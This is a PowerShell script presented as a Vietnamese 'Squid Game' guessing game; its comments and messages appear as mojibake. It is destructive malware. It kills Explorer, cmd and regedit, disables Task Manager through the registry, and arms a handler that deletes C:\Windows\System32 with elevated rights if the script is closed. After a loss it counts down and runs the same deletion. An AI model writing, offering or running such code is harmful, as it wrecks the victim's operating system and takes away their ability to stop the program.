Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;
public class MsgBox {
    public static void Show(string text, string caption) {
        MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    }
}
"@ -Language CSharp

# Hi·ªÉn th·ªã c·∫£nh b√°o
[MsgBox]::Show("Ch√†o m·ª´ng ƒë·∫øn v·ªõi Squid Game: ƒêo√°n S·ªë System32!`n`n- Ch∆°i 5 tr·∫≠n (BO5), m·ªói b√™n ƒëo√°n s·ªë c·ªßa nhau.`n- L∆∞·ª£t ƒëi tr∆∞·ªõc m·ªói tr·∫≠n l√† ng·∫´u nhi√™n.`n- N·∫øu thua 3 tr·∫≠n, System32 RIP!`n- Kh√¥ng nh·∫≠p trong 15 gi√¢y = T·ª± ƒë·ªông thua tr·∫≠n ƒë√≥.`n- Kh√¥ng th·ªÉ tho√°t game!`n`nCh√∫c may m·∫Øn!", "C·∫¢NH B√ÅO!")

# Kh√≥a c√°c l·ªëi tho√°t
Write-Host "Kh√≥a c√°c l·ªëi tho√°t..."
Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "cmd" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "regedit" -Force -ErrorAction SilentlyContinue

# Ch·∫∑n m·ªü Task Manager
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -PropertyType DWORD -Force | Out-Null

# Ch·∫∑n t·∫Øt script: N·∫øu b·ªã t·∫Øt, System32 RIP
Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Disposed -Action {
    Write-Host "B·∫°n ƒë√£ c·ªë tho√°t! X√≥a System32 ngay l·∫≠p t·ª©c..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
} | Out-Null

# Bi·∫øn l∆∞u s·ªë tr·∫≠n th·∫Øng/thua
$winCount = 0
$loseCount = 0

# H√†m l·∫•y s·ªë nh·∫≠p v√†o t·ª´ ng∆∞·ªùi ch∆°i
function Get-PlayerNumber {
    param ($message)
    $timeout = 15
    $startTime = Get-Date
    $playerNumber = $null

    while ((New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds -lt $timeout) {
        if ($Host.UI.RawUI.KeyAvailable) {
            $playerNumber = Read-Host $message
            break
        }
        Start-Sleep -Milliseconds 500
    }

    # N·∫øu kh√¥ng nh·∫≠p k·ªãp
    if (-not $playerNumber) {
        Write-Host "B·∫°n ƒë√£ ch·∫≠m tay! Tr·∫≠n n√†y t√≠nh l√† thua!"
        return $null
    }

    # Ki·ªÉm tra n·∫øu nh·∫≠p kh√¥ng ph·∫£i l√† s·ªë
    if (-not ($playerNumber -match "^\d+$")) {
        Write-Host "L·ªói! B·∫°n ph·∫£i nh·∫≠p m·ªôt s·ªë h·ª£p l·ªá. Tr·∫≠n n√†y t√≠nh l√† thua!"
        return $null
    }

    return [int]$playerNumber
}

# Ch∆°i 5 tr·∫≠n
for ($round=1; $round -le 5; $round++) {
    Write-Host "`n--- Tr·∫≠n $round/5 ---"

    # Random ng∆∞·ªùi ƒëi tr∆∞·ªõc
    $playerFirst = Get-Random -Minimum 0 -Maximum 2
    if ($playerFirst -eq 1) {
        Write-Host "B·∫°n ƒëi tr∆∞·ªõc!"
    } else {
        Write-Host "Windows ƒëi tr∆∞·ªõc!"
    }

    # Windows ch·ªçn s·ªë b√≠ m·∫≠t
    $windowsNumber = Get-Random -Minimum 1 -Maximum 11

    # Ng∆∞·ªùi ch∆°i ƒëo√°n (n·∫øu ƒëi tr∆∞·ªõc)
    if ($playerFirst -eq 1) {
        $playerGuess = Get-PlayerNumber "Nh·∫≠p s·ªë c·ªßa b·∫°n (1-10)"
        if ($playerGuess -eq $null) {
            $loseCount++
            continue
        }

        # Ki·ªÉm tra k·∫øt qu·∫£
        if (($playerGuess -ge ($windowsNumber - 2)) -and ($playerGuess -le ($windowsNumber + 2))) {
            Write-Host "‚úÖ B·∫°n ƒë√£ ƒëo√°n g·∫ßn ƒë√∫ng! B·∫°n th·∫Øng tr·∫≠n n√†y!"
            $winCount++
        } else {
            Write-Host "‚ùå B·∫°n ƒë√£ ƒëo√°n sai! B·∫°n thua tr·∫≠n n√†y!"
            $loseCount++
        }
    }

    # Windows ƒëo√°n s·ªë c·ªßa b·∫°n
    $playerNumber = Get-PlayerNumber "Nh·∫≠p m·ªôt s·ªë b√≠ m·∫≠t cho Windows ƒëo√°n (1-10)"
    if ($playerNumber -eq $null) {
        $loseCount++
        continue
    }

    # Windows ƒëo√°n s·ªë c·ªßa ng∆∞·ªùi ch∆°i
    $windowsGuess = Get-Random -Minimum 1 -Maximum 11
    Write-Host "Windows ƒë√£ ƒëo√°n: $windowsGuess"

    if (($windowsGuess -ge ($playerNumber - 2)) -and ($windowsGuess -le ($playerNumber + 2))) {
        Write-Host "üòà Windows ƒëo√°n ƒë√∫ng! B·∫°n thua tr·∫≠n n√†y!"
        $loseCount++
    } else {
        Write-Host "üéâ Windows ƒëo√°n sai! B·∫°n th·∫Øng tr·∫≠n n√†y!"
        $winCount++
    }

    # Ki·ªÉm tra n·∫øu ƒë√£ th·∫Øng/thua 3 tr·∫≠n ƒë·ªÉ k·∫øt th√∫c s·ªõm
    if ($winCount -ge 3) {
        Write-Host "`nüî• B·∫°n ƒë√£ th·∫Øng 3 tr·∫≠n! System32 an to√†n!"
        break
    }
    if ($loseCount -ge 3) {
        Write-Host "`nüíÄ B·∫°n ƒë√£ thua 3 tr·∫≠n! System32 RIP!"
        break
    }
}

# Ki·ªÉm tra k·∫øt qu·∫£ cu·ªëi c√πng
if ($winCount -ge 3) {
    Write-Host "`nüéâ Ch√∫c m·ª´ng! B·∫°n ƒë√£ th·∫Øng √≠t nh·∫•t 3 tr·∫≠n! System32 v·∫´n an to√†n!"
} else {
    Write-Host "`nB·∫°n ƒë√£ thua. Nh∆∞ b·∫°n ƒë√£ ƒë·ªçc, System32 s·∫Ω b·ªã x√≥a."
    Write-Host "Nh∆∞ng t√¥i c≈©ng kh√¥ng ph·∫£i ng∆∞·ªùi x·∫•u, n√™n t√¥i s·∫Ω cho b·∫°n th√™m 2 ph√∫t s·ª≠ d·ª•ng tr∆∞·ªõc khi m√°y t√≠nh n√†y ho√†n to√†n v√¥ d·ª•ng. Ch√∫c may m·∫Øn."
    
    # ƒê·∫øm ng∆∞·ª£c 2 ph√∫t
    for ($i=120; $i -ge 1; $i--) {
        Write-Host "`rC√≤n l·∫°i: $i gi√¢y" -NoNewline
        Start-Sleep -Seconds 1
    }

    # X√≥a System32 sau 2 ph√∫t
    Write-Host "`nH·∫øt th·ªùi gian. X√≥a System32 ngay b√¢y gi·ªù..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
}

# M·ªü l·∫°i Explorer khi k·∫øt th√∫c
Start-Process explorer.exe

# Kh√¥i ph·ª•c quy·ªÅn m·ªü Task Manager
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
